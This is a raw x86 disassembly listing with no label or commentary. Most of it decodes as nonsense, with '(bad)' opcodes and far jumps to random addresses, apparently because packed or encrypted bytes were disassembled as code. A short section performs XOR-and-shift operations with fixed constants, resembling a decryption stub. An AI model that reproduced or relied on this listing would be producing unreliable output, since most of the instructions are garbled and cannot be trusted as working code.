  4073fa:	fs jge 0x4073c4
  4073fd:	inc    esp
  4073fe:	pop    es
  4073ff:	loop   0x407392
  407401:	outs   dx,DWORD PTR ds:[esi]
  407402:	shl    BYTE PTR [ebp+0x243c5833],0x27
  407409:	add    al,0x6
  40740b:	mov    cl,0xa8
  40740d:	out    0x59,eax
  40740f:	retf   
  407410:	fimul  DWORD PTR [ebx-0xe]
  407413:	add    DWORD PTR [ebp+0x49],ebx
  407416:	inc    edi
  407417:	popf   
  407418:	cmp    al,0xa7
  40741a:	mov    ebx,0xd6440734
  40741f:	mov    fs,WORD PTR [eax+0x4690c538]
  407425:	mov    ?,WORD PTR [eax-0x3158f6f6]
  40742b:	add    esp,eax
  40742d:	fimul  WORD PTR [ecx-0x76]
  407430:	cmp    BYTE PTR [ebp+0x67],dh
  407433:	sbb    al,0x0
  407435:	or     BYTE PTR [eax],bh
  407437:	dec    edx
  407438:	je     0x407442
  40743a:	or     eax,0x868edecb
  40743f:	aad    0xed
  407441:	jns    0x40743e
  407443:	adc    esp,DWORD PTR [ebp+0x7f]
  407446:	and    esp,DWORD PTR [ebx+0x2773b246]
  40744c:	in     al,dx
  40744d:	ret    0x56fa
  407450:	push   esp
  407451:	add    ah,bl
  407453:	jb     0x40743c
  407455:	in     eax,dx
  407456:	pop    esp
  407457:	je     0x40746f
  407459:	or     BYTE PTR [eax-0x66a48c3b],0x42
  407460:	out    0xac,al
  407462:	test   DWORD PTR [edx*1+0x3128d3c1],ecx
  407469:	sbb    eax,0x26097903
  40746e:	mov    edx,0x245cceba
  407473:	repnz ins DWORD PTR es:[edi],dx
  407475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407476:	push   cs
  407477:	dec    esp
  407478:	stos   DWORD PTR es:[edi],eax
  407479:	push   0xffffff9f
  40747b:	cld    
  40747c:	fadd   QWORD PTR [eax-0x4d]
  40747f:	xor    dh,BYTE PTR [edi+0x72ff0216]
  407485:	mov    edx,0xa922027
  40748a:	mov    esi,0x7d936de4
  40748f:	mov    es,WORD PTR [esi-0x16]
  407492:	fadd   DWORD PTR [ebp+0x1d07a0e7]
  407498:	inc    esi
  407499:	add    bl,ch
  40749b:	sub    ebp,DWORD PTR [ecx+0x1c]
  40749e:	dec    eax
  40749f:	loopne 0x407432
  4074a1:	leave  
  4074a2:	retf   0xfbb2
  4074a5:	dec    esi
  4074a6:	and    esp,DWORD PTR ds:0xf9f9c48c
  4074ac:	mov    eax,ds:0x3bbb0811
  4074b1:	mov    bh,0x5a
  4074b3:	lods   eax,DWORD PTR ds:[esi]
  4074b4:	push   ebx
  4074b5:	call   0xc9b6:0xc6991963
  4074bc:	cmp    esi,DWORD PTR [edx-0x71]
  4074bf:	push   ebx
  4074c0:	pop    esp
  4074c1:	sbb    al,0x29
  4074c3:	fidiv  WORD PTR ds:0x95094e64
  4074c9:	add    al,0xc
  4074cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074cc:	push   esi
  4074cd:	(bad)  
  4074ce:	inc    ebp
  4074cf:	add    al,0xeb
  4074d1:	push   es
  4074d2:	outs   dx,DWORD PTR ds:[esi]
  4074d3:	call   0x39fb:0xdbe2f119
  4074da:	out    dx,al
  4074db:	mov    cl,0x1a
  4074dd:	pop    ebx
  4074de:	test   al,0x20
  4074e0:	arpl   WORD PTR gs:[esi+0x7ed4c1f6],bx
  4074e7:	retf   
  4074e8:	xchg   esi,eax
  4074e9:	repz shrd DWORD PTR [esi],esi,cl
  4074ed:	fs or  eax,0x992293fc
  4074f3:	stos   BYTE PTR es:[edi],al
  4074f4:	add    al,BYTE PTR [esi]
  4074f6:	ss mov edi,gs
  4074f9:	mov    ds:0xb7667a77,al
  4074fe:	(bad)  
  4074ff:	xlat   BYTE PTR ds:[ebx]
  407500:	(bad)  
  407501:	ds push eax
  407503:	cmp    ch,BYTE PTR [edi-0x5a]
  407506:	xor    ecx,DWORD PTR [ecx+0x710065e8]
  40750c:	pop    ds
  40750d:	adc    DWORD PTR [edx+0x21d93e5a],edx
  407513:	push   ebx
  407514:	push   cs
  407515:	in     eax,0xc3
  407517:	repz xlat BYTE PTR ds:[ebx]
  407519:	push   cs
  40751a:	mov    ?,WORD PTR [edx+0x39]
  40751d:	mul    DWORD PTR [ebp+0x7c]
  407520:	mov    ecx,0xc68fba8f
  407525:	sbb    BYTE PTR [esi],ch
  407527:	xchg   ebp,eax
  407528:	jbe    0x407571
  40752a:	inc    esp
  40752b:	(bad)  
  40752c:	push   ds
  40752d:	and    edi,0x145119b4
  407533:	mov    edi,DWORD PTR [ebx+0x3d]
  407536:	fimul  WORD PTR [esi+0x3a540dd]
  40753c:	dec    ebx
  40753d:	or     eax,0x772706df
  407542:	daa    
  407543:	(bad)  
  407544:	push   esi
  407545:	cld    
  407546:	push   ebx
  407547:	hlt    
  407548:	xor    cl,al
  40754a:	or     eax,0xc20ad688
  40754f:	sub    edx,DWORD PTR [ecx]
  407551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407552:	jmp    0xce79f52d
  407557:	clc    
  407558:	and    ah,BYTE PTR [ebx+0x6087d452]
  40755e:	mov    ecx,0x90edcd73
  407563:	aad    0x9
  407565:	ins    BYTE PTR es:[edi],dx
  407566:	sub    eax,0xa8f5de6
  40756b:	loop   0x4075a7
  40756d:	sub    BYTE PTR [ecx+0x75],dl
  407570:	pop    edi
  407571:	int    0x3d
  407573:	loopne 0x407528
  407575:	push   0xed29795b
  40757a:	(bad)  
  40757b:	les    ecx,FWORD PTR [edi]
  40757d:	fsub   QWORD PTR ds:0xa29f50b8
  407583:	lods   eax,DWORD PTR ds:[esi]
  407584:	cmp    edi,DWORD PTR [ecx+ebx*4+0x4d35157b]
  40758b:	pop    ds
  40758c:	xchg   ebx,eax
  40758d:	mov    ecx,edx
  40758f:	xor    ah,BYTE PTR [ecx-0x75]
  407592:	dec    ebp
  407593:	mov    ah,0xf
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0xf9
  407613:	mov    ebp,0x7d1770a1
  407618:	sbb    BYTE PTR [eax],bl
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    BYTE PTR [esi],bh
  40761f:	shr    DWORD PTR [eax+esi*1],1
  407622:	in     al,dx
  407623:	popa   
  407624:	leave  
  407625:	push   edx
  407626:	scas   eax,DWORD PTR es:[edi]
  407627:	(bad)  
  407628:	pop    ds
  407629:	ret    
  40762a:	les    eax,FWORD PTR ds:0x8349e07c
  407630:	daa    
  407631:	and    ah,BYTE PTR [ecx]
  407633:	xlat   BYTE PTR ds:[ebx]
  407634:	mov    bl,0x6a
  407636:	sub    esp,DWORD PTR [edi]
  407638:	adc    eax,0x566ba813
  40763d:	pop    esi
  40763e:	jg     0x407629
  407640:	and    bh,ch
  407642:	repnz (bad) 
  407644:	lock mov al,0x61
  407647:	cmp    eax,0x75
  40764a:	adc    al,0x1
  40764c:	das    
  40764d:	push   edx
  40764e:	adc    dl,BYTE PTR [ecx+0x10]
  407651:	xor    ebp,esp
  407653:	mov    edi,0x14e9e71d
  407658:	outs   dx,BYTE PTR ds:[esi]
  407659:	push   ebx
  40765a:	int    0xdc
  40765c:	sar    ecx,0xf6
  40765f:	mov    al,BYTE PTR [eax+0x4d]
  407662:	mov    al,ds:0xfa638f0e
  407667:	adc    eax,0x649ab66f
  40766c:	mov    edi,ebx
  40766e:	push   ebx
  40766f:	stos   DWORD PTR es:[edi],eax
  407670:	adc    DWORD PTR [ebp-0x2f8f883b],esp
  407676:	(bad)  
  407677:	addr16 inc edx
  407679:	lock sub al,ch
  40767c:	loopne 0x407692
  40767e:	xchg   esp,eax
  40767f:	lock into 
  407681:	and    BYTE PTR [ecx],0xed
  407684:	retf   
  407685:	or     DWORD PTR [ebp+0x5c],ecx
  407688:	cmp    eax,0x74a5abb0
  40768d:	bound  esi,QWORD PTR [edi+edi*1+0x7c]
  407691:	faddp  st(4),st
  407693:	push   es
  407694:	adc    al,0x59
  407696:	jne    0x407643
  407698:	push   esi
  407699:	xchg   ebx,ecx
  40769b:	ss js  0x40768a
  40769e:	or     bl,bh
  4076a0:	clc    
  4076a1:	stos   DWORD PTR es:[edi],eax
  4076a2:	mov    WORD PTR [esi-0x374dc639],?
  4076a8:	pop    es
  4076a9:	popa   
  4076aa:	pop    ebx
  4076ab:	mov    BYTE PTR [ebx],bl
  4076ad:	sbb    BYTE PTR [ecx],0x34
  4076b0:	push   es
  4076b1:	shr    DWORD PTR [edx+0x79],0x3d
  4076b5:	mov    ebx,ebx
  4076b7:	out    0x38,al
  4076b9:	sbb    DWORD PTR [edx-0x20],esi
  4076bc:	or     bh,BYTE PTR [eax]
  4076be:	test   eax,0x9c2232b6
  4076c3:	lahf   
  4076c4:	clc    
  4076c5:	push   edi
  4076c6:	call   0x43971da0
  4076cb:	out    dx,al
  4076cc:	push   0x9044e7f3
  4076d1:	sub    DWORD PTR [edx+eax*4+0x5e],edx
  4076d5:	out    dx,eax
  4076d6:	outs   dx,DWORD PTR ds:[esi]
  4076d7:	(bad)  
  4076d8:	ss ins DWORD PTR es:[edi],dx
  4076da:	sub    BYTE PTR [esi+ebp*8-0x2393b62e],ah
  4076e1:	mov    bh,0xf1
  4076e3:	cmc    
  4076e4:	jb     0x4076bc
  4076e6:	ins    BYTE PTR es:[edi],dx
  4076e7:	icebp  
  4076e8:	cmp    al,0x2e
  4076ea:	fcom   QWORD PTR [ecx+ebx*4+0x2c]
  4076ee:	jo     0x407697
  4076f0:	mov    dh,0x30
  4076f2:	jecxz  0x407678
  4076f4:	popw   es
  4076f6:	test   esi,esp
  4076f8:	nop
  4076f9:	ret    0x689
  4076fc:	fmul   QWORD PTR [ecx]
  4076fe:	call   0x92ea6549
  407703:	les    ebx,FWORD PTR [edi]
  407705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407706:	mov    ecx,0x41628648
  40770b:	xor    bh,BYTE PTR [edx+eiz*4+0x74c9b4b2]
  407712:	iret   
  407713:	cdq    
  407714:	fild   QWORD PTR [ebp-0x7a1b0e4]
  40771a:	daa    
  40771b:	mov    ch,0xc3
  40771d:	aad    0x1
  40771f:	cmp    DWORD PTR [ecx+0x33],edi
  407722:	mov    dh,0x92
  407724:	loope  0x407751
  407726:	mov    esi,ebp
  407728:	sub    DWORD PTR [esi-0x5f3513e5],ebx
  40772e:	(bad)  
  407730:	xchg   edx,eax
  407731:	loop   0x407709
  407733:	arpl   WORD PTR [ecx],bx
  407735:	inc    edx
  407736:	repnz push ss
  407738:	out    dx,al
  407739:	xchg   edi,eax
  40773a:	cs jbe 0x407732
  40773d:	add    BYTE PTR [edi+0x5b],0x9d
  407741:	mov    ah,0x81
  407743:	mov    eax,0x34266dce
  407748:	rcl    DWORD PTR [ebx],cl
  40774a:	lock jle 0x407790
  40774d:	(bad)
  407750:	lock add BYTE PTR [edi+0x508fec30],ah
  407757:	popf   
  407758:	xlat   BYTE PTR ds:[ebx]
  407759:	xor    al,0xd4
  40775b:	xchg   BYTE PTR [edx+edx*1-0x5b04cd3],dh
  407762:	xchg   esp,eax
  407763:	lds    edi,FWORD PTR ds:0x25a90e91
  407769:	outs   dx,DWORD PTR ds:[esi]
  40776a:	pop    edx
  40776b:	loopne 0x4077e9
  40776d:	retf   
  40776e:	or     al,0xcb
  407770:	sub    ch,BYTE PTR [ebx-0x40]
  407773:	aad    0xc8
  407775:	mov    dl,dl
  407777:	loope  0x407749
  407779:	cmp    bl,BYTE PTR [ebx]
  40777b:	and    edx,DWORD PTR [eax+0x70]
  40777e:	(bad)
  407781:	inc    ecx
  407782:	(bad)  
  407783:	xchg   edx,eax
  407784:	fwait
  407785:	push   edx
  407786:	lods   al,BYTE PTR ds:[esi]
  407787:	cmp    al,0x9f
  407789:	adc    esp,0xbb7e32fb
  40778f:	sbb    DWORD PTR [ecx+0x22],esp
  407792:	jns    0x4077ca
  407794:	sub    bh,ch
  407796:	push   0xffffff9e
  407798:	xor    DWORD PTR [ebx],esi
  40779a:	(bad)  
  40779b:	retf   
  40779c:	sbb    BYTE PTR [edi],ah
  40779e:	xchg   DWORD PTR [eax-0xa01042e],esi
  4077a4:	outs   dx,DWORD PTR ds:[esi]
  4077a5:	lock ss icebp 
  4077a8:	in     al,dx
  4077a9:	loopne 0x40779e
  4077ab:	xor    bl,BYTE PTR [ebp+0x3cca5b8b]
  4077b1:	xchg   ebx,eax
  4077b2:	fwait
  4077b3:	mov    al,ds:0xaafcd873
  4077b8:	lahf   
  4077b9:	inc    ecx
  4077ba:	jmp    0xae20:0x3e5b0717
  4077c1:	test   al,0x98
  4077c3:	dec    ecx
  4077c4:	lock push ebp
  4077c6:	ins    DWORD PTR es:[edi],dx
  4077c7:	adc    eax,0xb755b140
  4077cc:	sub    ch,BYTE PTR [edx-0x78873739]
  4077d2:	pop    edx
  4077d3:	mov    ch,0x99
  4077d5:	pop    ecx
  4077d6:	mov    edi,0x5aed69ef
  4077db:	pop    edx
  4077dc:	jg     0x40779b
  4077de:	sub    esp,DWORD PTR [eax]
  4077e0:	sub    al,0xd
  4077e2:	es dec ebp
  4077e4:	mov    BYTE PTR [edi+eax*4+0x1f2afaa6],0xcb
  4077ec:	adc    al,0x84
  4077ee:	js     0x407799
  4077f0:	repz shl BYTE PTR [edx],cl
  4077f3:	sub    al,0x16
  4077f5:	jno    0x407858
  4077f7:	push   eax
  4077f8:	into   
  4077f9:	(bad)  
  4077fa:	fimul  WORD PTR [ecx-0x383d61e]
  407800:	sbb    eax,0x657945a4
  407805:	arpl   WORD PTR [edi-0x51],di
  407808:	stc    
  407809:	and    dh,cl
  40780b:	jecxz  0x407813
  40780d:	icebp  
  40780e:	xchg   ecx,eax
  40780f:	daa    
  407810:	in     eax,0x27
  407812:	xchg   ebx,eax
  407813:	or     dh,BYTE PTR [ecx-0x46]
  407816:	push   edi
  407817:	add    al,0xe4
  407819:	xor    DWORD PTR [ebx],ecx
  40781b:	inc    ecx
  40781c:	pushf  
  40781d:	push   cs
  40781e:	xchg   ebx,eax
  40781f:	xchg   edx,eax
  407820:	(bad)  
  407822:	xchg   ecx,eax
  407823:	call   0xfd7548b2
  407828:	sbb    DWORD PTR [ecx+edi*4+0x7e],esp
  40782c:	inc    eax
  40782d:	jns    0x4077b3
  40782f:	xor    DWORD PTR [edx],esp
  407831:	out    dx,eax
  407832:	in     al,0xb1
  407834:	data16 jle 0x4078ae
  407837:	xchg   edx,eax
  407838:	jbe    0x40783f
  40783a:	das    
  40783b:	sub    BYTE PTR [edi],bh
  40783d:	in     al,0xf9
  40783f:	in     al,dx
  407840:	xchg   edx,eax
  407841:	inc    esi
  407842:	cdq    
  407843:	inc    ebx
  407844:	imul   ebx,DWORD PTR [esi+0x78],0xffffffe2
  407848:	mov    edx,0x73160063
  40784d:	or     dh,0x56
  407850:	pop    esi
  407851:	icebp  
  407852:	(bad)  
  407853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407854:	loop   0x407842
  407856:	cwde   
  407857:	fisttp QWORD PTR [ecx-0x1a8373d8]
  40785d:	jno    0x407816
  40785f:	mov    edi,0x25686257
  407864:	or     BYTE PTR [ecx],bl
  407866:	loop   0x4077ef
  407868:	xlat   BYTE PTR ds:[ebx]
  407869:	int    0xe
  40786b:	xchg   edi,eax
  40786c:	enter  0x60ee,0xf7
  407870:	inc    edx
  407871:	push   cs
  407872:	ins    BYTE PTR es:[edi],dx
  407873:	mov    edx,0x9beb4271
  407878:	jne    0x4078e7
  40787a:	sbb    eax,DWORD PTR [eax-0x5]
  40787d:	cmp    bh,BYTE PTR [ecx-0x316c0ff0]
  407883:	mov    eax,0x664385b7
  407888:	cmp    BYTE PTR [edi],cl
  40788a:	push   edi
  40788b:	mov    ds:0xc098102e,al
  407890:	mov    ecx,0x29c6df05
  407895:	sub    DWORD PTR [esi-0x1e],esp
  407898:	std    
  407899:	inc    esi
  40789a:	jp     0x40790e
  40789c:	mov    cl,0xe3
  40789e:	pop    ecx
  40789f:	scas   eax,DWORD PTR es:[edi]
  4078a0:	je     0x407824
  4078a2:	sub    al,dl
  4078a4:	fiadd  WORD PTR cs:[ebx]
  4078a7:	xchg   ebp,ecx
  4078a9:	fucom  st(4)
  4078ab:	mov    DWORD PTR [ebx],eax
  4078ad:	jmp    0x41bb:0x35cefe6d
  4078b4:	cwde   
  4078b5:	jmp    0x7f70:0x813c520a
  4078bc:	fsub   st(0),st
  4078bf:	cld    
  4078c0:	and    al,0x22
  4078c2:	cmp    BYTE PTR [edi],al
  4078c4:	pusha  
  4078c5:	pop    ebp
  4078c6:	leave  
  4078c7:	js     0x407880
  4078c9:	mov    edx,0x5e9bdb3a
  4078ce:	add    BYTE PTR [eax],0x45
  4078d1:	rcr    BYTE PTR [eax],cl
  4078d3:	sub    BYTE PTR [eax-0x4a],ah
  4078d6:	cs pushf 
  4078d8:	xchg   ecx,eax
  4078d9:	fnstcw WORD PTR [esp+eax*2+0x3e56b504]
  4078e0:	mov    ch,0x2e
  4078e2:	nop
  4078e3:	pop    esi
  4078e4:	scas   eax,DWORD PTR es:[edi]
  4078e5:	xor    al,0xff
  4078e7:	dec    edi
  4078e8:	mov    ?,WORD PTR [ebx-0x2d]
  4078eb:	fmul   QWORD PTR [edi-0x21236a75]
  4078f1:	push   0x47
  4078f3:	idiv   BYTE PTR [ecx]
  4078f5:	mov    esp,ss
  4078f7:	xadd   BYTE PTR [ebx],dl
  4078fa:	dec    ebp
  4078fb:	mov    esi,esp
  4078fd:	xchg   esp,eax
  4078fe:	cld    
  4078ff:	jmp    0xdc26c0fa
  407904:	mov    bh,0x14
  407906:	out    dx,eax
  407907:	call   0xb8ad19b3
  40790c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40790d:	enter  0xbde,0xf4
  407911:	cmp    al,BYTE PTR [edx]
  407913:	popa   
  407914:	or     eax,0x98ca3bcb
  407919:	test   DWORD PTR [edi+ebx*1-0x1bca37e5],ecx
  407920:	mov    ds:0x979c4702,eax
  407925:	sbb    bh,BYTE PTR [ecx+0x7f]
  407928:	fcomip st,st(6)
  40792a:	test   al,0xbc
  40792c:	scas   al,BYTE PTR es:[edi]
  40792d:	sbb    dl,BYTE PTR ds:0x89e70ca4
  407933:	test   BYTE PTR [esp+edi*8+0x38210b82],bl
  40793a:	lahf   
  40793b:	xchg   edx,eax
  40793c:	fsubr  QWORD PTR [ecx-0x12e14429]
  407942:	sbb    ah,BYTE PTR [ebx-0x77]
  407945:	cmp    dh,BYTE PTR [edx-0x6e0872f5]
  40794b:	xchg   edx,eax
  40794c:	sbb    DWORD PTR [esi+0xa67737d],edx
  407952:	xchg   edx,eax
  407953:	mov    ebp,0xc443e9f4
  407958:	push   ss
  407959:	into   
  40795a:	xor    DWORD PTR [eax+0x7b0fc866],edi
  407960:	fwait
  407961:	push   ebp
  407962:	sbb    ebx,DWORD PTR [ebp-0x7f3284c7]
  407968:	inc    edi
  407969:	out    0xfd,al
  40796b:	out    0xcb,eax
  40796d:	and    eax,0x54ca0f5d
  407972:	sbb    DWORD PTR [ecx],esp
  407974:	lods   al,BYTE PTR ds:[esi]
  407975:	sub    eax,0x9d520cab
  40797a:	sti    
  40797b:	pop    es
  40797c:	jb     0x40798b
  40797e:	pusha  
  40797f:	dec    ebp
  407980:	dec    esp
  407981:	test   eax,0x916df6e9
  407986:	jb     0x40793f
  407988:	(bad)  
  407989:	loopne 0x407941
  40798b:	(bad)  
  40798c:	jae    0x4079fc
  40798e:	test   al,0xec
  407990:	js     0x4079fd
  407992:	(bad)  
  407993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407994:	lods   al,BYTE PTR ds:[esi]
  407995:	adc    BYTE PTR [ebx-0x6],dl
  407998:	pop    es
  407999:	sbb    al,dl
  40799b:	sub    DWORD PTR [ebp+edi*4+0x13],0x7e
  4079a0:	mul    BYTE PTR [esi-0xf]
  4079a3:	xchg   eax,esp
  4079a5:	int3   
  4079a6:	or     eax,0xd96106ff
  4079ab:	enter  0x23ab,0xb0
  4079af:	das    
  4079b0:	aaa    
  4079b1:	mov    edi,0xebac7874
  4079b6:	dec    esi
  4079b7:	xor    cl,BYTE PTR [ebp*4+0x67f55048]
  4079be:	pop    ebp
  4079bf:	shl    DWORD PTR [esi],0x65
  4079c2:	sub    al,0xbc
  4079c4:	or     ecx,edx
  4079c6:	(bad)  
  4079c7:	xchg   ecx,eax
  4079c8:	imul   ebx,DWORD PTR [ebx],0xffffffe2
  4079cb:	or     BYTE PTR [edx],ah
  4079cd:	or     eax,0xfceafb72
  4079d2:	mov    al,0xbe
  4079d4:	(bad)  
  4079d5:	in     eax,0x71
  4079d7:	cmp    al,0x99
  4079d9:	nop
  4079da:	xchg   ebx,eax
  4079db:	sub    DWORD PTR [ebx+0x45892069],0xffffffcc
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079e0
  4079f4:	push   edi
  4079f5:	lods   eax,DWORD PTR ds:[esi]
  4079f6:	mov    al,0x9d
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x30181812],bl
  407a00:	in     eax,0x5a
  407a02:	xor    DWORD PTR ds:0x6c39f286,edx
  407a08:	mov    ah,0x5d
  407a0a:	sahf   
  407a0b:	pop    esp
  407a0c:	jbe    0x4079e7
  407a0e:	jp     0x407a08
  407a10:	cmp    al,0xd5
  407a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a13:	sub    BYTE PTR [ebp+0x71e9decb],dh
  407a19:	jecxz  0x407a0d
  407a1b:	sahf   
  407a1c:	pop    ebp
  407a1d:	inc    esp
  407a1e:	repz pop ds
  407a20:	iret   
  407a21:	pcmpeqd mm4,mm0
  407a24:	and    ch,BYTE PTR [edi]
  407a26:	pop    edx
  407a27:	sahf   
  407a28:	mov    eax,ds:0x6daeebda
  407a2d:	lods   eax,DWORD PTR ds:[esi]
  407a2e:	jo     0x407a57
  407a30:	or     eax,0x83f49522
  407a35:	mov    bh,0x62
  407a37:	out    dx,eax
  407a38:	fdiv   QWORD PTR [esi+0x66]
  407a3b:	jg     0x407a71
  407a3d:	js     0x4079f4
  407a3f:	dec    ebx
  407a40:	sub    ecx,ebx
  407a42:	js     0x407a79
  407a44:	inc    ebp
  407a45:	jg     0x407a50
  407a47:	stos   DWORD PTR es:[edi],eax
  407a48:	adc    dh,BYTE PTR [edi]
  407a4a:	js     0x4079f0
  407a4c:	pop    edx
  407a4d:	push   eax
  407a4e:	and    DWORD PTR [ebp+0x2c],edx
  407a51:	xchg   ecx,eax
  407a52:	sub    al,0x73
  407a54:	xor    bh,BYTE PTR [edi+edx*2]
  407a57:	jmp    0x407a52
  407a59:	test   eax,0x503b4fd2
  407a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5f:	mov    ebp,0x72c50da4
  407a64:	xchg   esi,eax
  407a65:	stos   BYTE PTR es:[edi],al
  407a66:	adc    al,0x16
  407a68:	loop   0x4079f5
  407a6a:	pop    ds
  407a6b:	inc    ecx
  407a6c:	lahf   
  407a6d:	retf   0x6b4f
  407a70:	lods   eax,DWORD PTR ds:[esi]
  407a71:	ret    0x9214
  407a74:	push   ebp
  407a75:	repnz bound ebp,QWORD PTR [edi+0x5e753017]
  407a7c:	aam    0xcd
  407a7e:	adc    DWORD PTR [edx],eax
  407a80:	ficom  WORD PTR [ebx]
  407a82:	(bad)  
  407a83:	xchg   edx,eax
  407a84:	jmp    0x407a8c
  407a86:	stos   DWORD PTR es:[edi],eax
  407a87:	aas    
  407a88:	inc    ebp
  407a89:	or     al,0x3e
  407a8b:	int    0x8f
  407a8d:	lods   al,BYTE PTR ds:[esi]
  407a8e:	pop    esi
  407a8f:	pop    ds
  407a90:	call   0xc827:0xd0a8ca62
  407a97:	mov    ebx,0xf5c4f2c3
  407a9c:	xlat   BYTE PTR ds:[ebx]
  407a9d:	mov    dl,BYTE PTR [edi-0xbd6dc6a]
  407aa3:	and    dl,ah
  407aa5:	sub    DWORD PTR [ecx+0x65],ebx
  407aa8:	mov    ah,ch
  407aaa:	stos   BYTE PTR es:[edi],al
  407aab:	inc    ebp
  407aac:	xchg   BYTE PTR [esi+0x5807e5c8],ch
  407ab2:	loopne 0x407a3e
  407ab4:	push   0x797ad560
  407ab9:	cs aam 0x8f
  407abc:	sub    bh,BYTE PTR [ebp+0x6e]
  407abf:	push   es
  407ac0:	jge    0x407a5a
  407ac2:	push   0x6adb0fe3
  407ac7:	(bad)  
  407ac8:	or     esi,DWORD PTR ds:0x694ae50d
  407ace:	push   edi
  407acf:	getsec 
  407ad1:	jp     0x407a9e
  407ad3:	cmp    DWORD PTR [ebp+0x51],esi
  407ad6:	push   cs
  407ad7:	icebp  
  407ad8:	dec    ebp
  407ad9:	pop    es
  407ada:	shr    BYTE PTR cs:[ecx-0x69ad4dd6],1
  407ae1:	out    dx,al
  407ae2:	mov    ds:0xa54f7043,al
  407ae7:	pushf  
  407ae8:	loope  0x407b40
  407aea:	mov    ah,bl
  407aec:	pop    ebx
  407aed:	das    
  407aee:	mov    ecx,0x3be92bfc
  407af3:	add    ch,BYTE PTR [edx-0x30b132f9]
  407af9:	dec    edi
  407afa:	adc    DWORD PTR [esi],ecx
  407afc:	xor    edi,DWORD PTR [ebx+0x60]
  407aff:	mov    ch,0x99
  407b01:	ret    0xcb3c
  407b04:	pop    ebx
  407b05:	aam    0x41
  407b07:	cdq    
  407b08:	in     al,dx
  407b09:	xchg   edx,eax
  407b0a:	xor    al,0x2b
  407b0c:	mov    cl,0x5e
  407b0e:	fdivr  st(6),st
  407b10:	idiv   BYTE PTR [edx+0x5d04dc6e]
  407b16:	pop    esp
  407b17:	icebp  
  407b18:	cld    
  407b19:	or     DWORD PTR [ebp-0x5a],esi
  407b1c:	jo     0x407b33
  407b1e:	xlat   BYTE PTR ds:[ebx]
  407b1f:	ret    0x4a4c
  407b22:	add    BYTE PTR [edx+edi*1],dl
  407b25:	fdiv   st,st(7)
  407b27:	icebp  
  407b28:	sbb    ebx,DWORD PTR [ebp-0x6fb6df8f]
  407b2e:	dec    ebx
  407b2f:	push   es
  407b30:	and    DWORD PTR [ebp+0x41],ebp
  407b33:	rcl    DWORD PTR [ecx],0x88
  407b36:	or     BYTE PTR [edi],bl
  407b38:	cmp    al,BYTE PTR [edx-0x5]
  407b3b:	cmp    al,0x82
  407b3d:	arpl   dx,bx
  407b3f:	add    ebx,DWORD PTR [edx+ecx*8]
  407b42:	xchg   BYTE PTR [ebx],dh
  407b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b45:	mov    al,ds:0x8a201869
  407b4a:	pop    ecx
  407b4b:	dec    edi
  407b4c:	push   0x118fc9da
  407b51:	sahf   
  407b52:	es out dx,al
  407b54:	sbb    ebx,ecx
  407b56:	mov    ebp,0xbd8e7f44
  407b5b:	mov    dh,0xf8
  407b5d:	ds jl  0x407bc8
  407b60:	outs   dx,DWORD PTR ds:[esi]
  407b61:	iret   
  407b62:	aaa    
  407b63:	jp     0x407b0c
  407b65:	xchg   ecx,eax
  407b66:	xchg   ebx,eax
  407b67:	cmp    BYTE PTR [ebx*4-0x5fac491f],dh
  407b6e:	inc    ebp
  407b6f:	jb     0x407b1f
  407b71:	dec    ax
  407b73:	push   eax
  407b74:	push   ebp
  407b75:	lahf   
  407b76:	jle    0x407b4b
  407b78:	xchg   DWORD PTR [esi],esp
  407b7a:	jg     0x407b57
  407b7c:	jb     0x407b30
  407b7e:	dec    ebp
  407b7f:	inc    ebx
  407b80:	lahf   
  407b81:	sbb    eax,0x7ea5c227
  407b86:	pop    edi
  407b87:	xor    bl,0x50
  407b8a:	jg     0x407b98
  407b8c:	push   0x2c02453c
  407b91:	pop    ds
  407b92:	retf   
  407b93:	pop    es
  407b94:	pushf  
  407b95:	dec    esi
  407b96:	mov    ah,0x58
